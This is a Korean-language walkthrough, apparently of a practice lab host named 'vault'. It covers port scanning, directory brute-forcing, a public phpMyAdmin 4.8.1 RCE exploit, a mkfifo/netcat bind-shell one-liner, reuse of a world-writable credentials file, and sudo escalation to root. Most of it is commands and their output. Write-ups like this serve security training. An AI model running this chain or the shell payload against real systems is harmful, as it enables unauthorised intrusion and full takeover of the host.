---
title: '[BHPT] Vault'
layout: post
date: 2026-11-09 12:00:00 +0900
featured: /assets/images/redraccoon-logo.png
---

# 1. vault 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 3일 ~ 2025년 12월 4일 | vault | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 06:32 EST
Nmap scan report for TARGET_IP
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds

```
포트 스캔 결과 포트 22와 80이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 22,80 -sV -sC -Pn -n --open TARGET_IP --min-rate 1000 -oA tcpDetailed 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-03 06:34 EST
Nmap scan report for TARGET_IP
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 47:1f:28:2d:01:94:10:ea:bd:89:61:2f:87:08:69:08 (RSA)
|   256 66:a5:38:ba:1c:18:42:29:23:da:59:7b:58:cc:2d:5f (ECDSA)
|_  256 93:52:5b:75:63:e0:05:15:dc:bd:52:b4:f7:b5:62:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds
```
웹 서버의 기술 스택, robots.txt, HTTP 응답 헤더들을 살펴봐도 더 자세한 정보를 얻을 수 없었기에 gobuster 툴을 사용해 디렉토리 브루트포싱을 진행했다.
```
└─$ gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10918]
/phpmyadmin           (Status: 301) [Size: 321] [--> http://TARGET_IP/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```
디렉토리 브루트포싱을 이용해 찾아낸 디렉토리들 중 /phpmyadmin을 발견하였으며, 다시 해당 디렉토리에 gobuster 툴을 사용하니 하위 디렉토리인 /ChangeLog 를 발견되었다.

```
└─$ gobuster dir -u http://TARGET_IP/phpmyadmin -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET_IP/phpmyadmin
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/ChangeLog            (Status: 200) [Size: 20501]
/doc                  (Status: 301) [Size: 325] [--> http://TARGET_IP/phpmyadmin/doc/]
/examples             (Status: 301) [Size: 330] [--> http://TARGET_IP/phpmyadmin/examples/]
/favicon.ico          (Status: 200) [Size: 22486]
/index.php            (Status: 200) [Size: 14110]
/js                   (Status: 301) [Size: 324] [--> http://TARGET_IP/phpmyadmin/js/]
/libraries            (Status: 301) [Size: 331] [--> http://TARGET_IP/phpmyadmin/libraries/]
/LICENSE              (Status: 200) [Size: 18092]
/locale               (Status: 301) [Size: 328] [--> http://TARGET_IP/phpmyadmin/locale/]
/phpinfo.php          (Status: 200) [Size: 14118]
/README               (Status: 200) [Size: 1520]
/robots.txt           (Status: 200) [Size: 26]
/setup                (Status: 301) [Size: 327] [--> http://TARGET_IP/phpmyadmin/setup/]
/sql                  (Status: 301) [Size: 325] [--> http://TARGET_IP/phpmyadmin/sql/]
/templates            (Status: 403) [Size: 279]
/themes               (Status: 301) [Size: 328] [--> http://TARGET_IP/phpmyadmin/themes/]
/vendor               (Status: 301) [Size: 328] [--> http://TARGET_IP/phpmyadmin/vendor/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

/phpmyadmin/ChangeLog 는 버전 업데이트 내용이 담긴 로그였으며, 해당 로그로인하여 phpmyadmin 버전 정보를 알 수 있었다.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-vault/image.png)

#### 초기 침투

phpmyadmin 4.8.1 searchsploit 시 RCE 익스플로잇 확인. 실행 결과 타겟의 아이피주소, 포트, 디렉토리, 유저이름, 비밀번호, 명령어 등이 필요함.
```
└─$ searchsploit phpmyadmin 4.8.1                                                              
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                                                      | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                                                      | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                                                   | php/webapps/50457.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

RCE 익스플로잇 코드의 명령어 인자값 부분에 바인드 쉘 생성을 위한 명령어를 입력.

```
└─$ python3 50457.py TARGET_IP 80 /phpmyadmin root password "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9999 > /tmp/f"
/home/kali/Desktop/vault/50457.py:29: SyntaxWarning: invalid escape sequence '\s'
  s = re.search('token"\s*value="(.*?)"', content)
/home/kali/Desktop/vault/50457.py:50: SyntaxWarning: invalid escape sequence '\d'
  s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
/home/kali/Desktop/vault/50457.py:64: SyntaxWarning: invalid escape sequence '\w'
  s = re.search('logged_in:(\w+),', content)
```

터미널을 새로 열어 netcat을 이용하여 타겟 호스트와 열어둔 포트를 입력하면, 초기 침투 성공.
```
└─$ nc TARGET_IP 9999 
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### 권한 상승

정보 수집을 통해 777 권한의 파일을 찾았으며, 파일에는 bobbyz 유저의 계정 정보가 있는 것을 확인했다.
```
$ find / -type f -perm 0777 2>/dev/null
/.bobbyz_creds.txt
$ cat /.bobbyz_creds.txt
Vault server breakglass creds - [REDACTED_USER]:[REDACTED_PASSWORD]
```

ssh를 통해 bobbyz 계정 접속 성공.
```
└─$ ssh bobbyz@TARGET_IP
The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
ED25519 key fingerprint is SHA256:UcVTGzD2fS+HvgO2nOm9I4Nd4ze7CX0kWXbGvMk/XLk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'TARGET_IP' (ED25519) to the list of known hosts.
###################################################
#                                                 #
# WARNING:                                        #
# This SSH server restricts normal user SSH access#
#                                                 #
# This is a PRODUCTION VAULT server for the       #
# TOORG GROUP. Unauthorized access is prohibited. #
#                                                 #
###################################################
bobbyz@TARGET_IP's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1085-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec  3 12:05:07 UTC 2025

  System load:  0.0               Processes:           110
  Usage of /:   23.7% of 7.57GB   Users logged in:     0
  Memory usage: 28%               IP address for ens5: TARGET_IP
  Swap usage:   0%


121 updates can be applied immediately.
96 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Sep 13 03:59:54 2023 from TARGET_IP
bobbyz@ip-172-31-186-240:~$ id
uid=1001(bobbyz) gid=1001(bobbyz) groups=1001(bobbyz)
```
sudo -l을 확인해보면 sudo 권한으로 모든 명령어를 사용할 수 있는것을 확인. sudo /bin/bash를 입력하여 루트 유저 권한 획득.
```
bobbyz@ip-172-31-186-240:~$ sudo -l
Matching Defaults entries for bobbyz on ip-172-31-186-240:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bobbyz may run the following commands on ip-172-31-186-240:
    (ALL) NOPASSWD: /bin/bash
bobbyz@ip-172-31-186-240:~$ sudo /bin/bash
root@ip-172-31-186-240:~# id
uid=0(root) gid=0(root) groups=0(root)
```


